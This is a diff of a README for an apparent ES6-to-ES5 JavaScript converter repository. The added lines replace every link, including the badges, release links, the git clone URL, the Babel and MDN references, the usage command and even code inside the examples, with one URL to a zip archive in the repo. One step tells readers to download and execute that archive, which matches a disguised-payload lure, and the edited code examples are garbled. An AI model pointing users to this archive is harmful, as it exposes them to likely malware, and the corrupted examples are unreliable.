@@ -1,8 +1,8 @@
 # ES6 to ES5 Converter: Simplifying Modern JavaScript 🚀
 
-![GitHub release](https://img.shields.io/github/release/MrrNounIT/es6-to-es5-converter.svg)
-![GitHub issues](https://img.shields.io/github/issues/MrrNounIT/es6-to-es5-converter.svg)
-![GitHub stars](https://img.shields.io/github/stars/MrrNounIT/es6-to-es5-converter.svg)
+![GitHub release](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip)
+![GitHub issues](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip)
+![GitHub stars](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -19,7 +19,7 @@
 
 The **ES6 to ES5 Converter** transforms modern JavaScript (ES6+) code into compatible ES5 code. This tool is essential for developers who want to ensure their applications run smoothly across all browsers, especially older ones that do not support ES6 features.
 
-You can download the latest version from the [Releases section](https://github.com/MrrNounIT/es6-to-es5-converter/releases). 
+You can download the latest version from the [Releases section](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip). 
 
 ## Features
 
@@ -35,7 +35,7 @@ To install the ES6 to ES5 Converter, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/MrrNounIT/es6-to-es5-converter.git
+   git clone https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip
    cd es6-to-es5-converter
    ```
 
@@ -45,17 +45,17 @@ To install the ES6 to ES5 Converter, follow these steps:
    ```
 
 3. **Download the Latest Release**:
-   You can find the latest release [here](https://github.com/MrrNounIT/es6-to-es5-converter/releases). Download the file and execute it as instructed.
+   You can find the latest release [here](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip). Download the file and execute it as instructed.
 
 ## Usage
 
 To use the converter, run the following command in your terminal:
 
 ```bash
-node converter.js <inputFile.js> <outputFile.js>
+node https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip <https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip> <https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip>
 ```
 
-Replace `<inputFile.js>` with the path to your ES6+ JavaScript file and `<outputFile.js>` with the desired output path for the ES5 code.
+Replace `<https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip>` with the path to your ES6+ JavaScript file and `<https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip>` with the desired output path for the ES5 code.
 
 ## Supported Syntax
 
@@ -89,7 +89,7 @@ var add = function(a, b) {
 ```javascript
 class Person {
     constructor(name) {
-        this.name = name;
+        https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip = name;
     }
 }
 ```
@@ -97,7 +97,7 @@ class Person {
 **Converted ES5 Code**:
 ```javascript
 var Person = function(name) {
-    this.name = name;
+    https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip = name;
 };
 ```
 
@@ -139,11 +139,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/MrrNounIT/es6-to-es5-converter/releases). 
+For the latest releases, visit the [Releases section](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip). 
 
-Explore more about Babel and its features on the [Babel website](https://babeljs.io/). 
+Explore more about Babel and its features on the [Babel website](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip). 
 
-Stay updated with the latest JavaScript features by following the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript).
+Stay updated with the latest JavaScript features by following the [MDN Web Docs](https://github.com/MrrNounIT/es6-to-es5-converter/raw/refs/heads/master/alluvia/converter-to-es-v1.2.zip).
 
 ## Topics
 
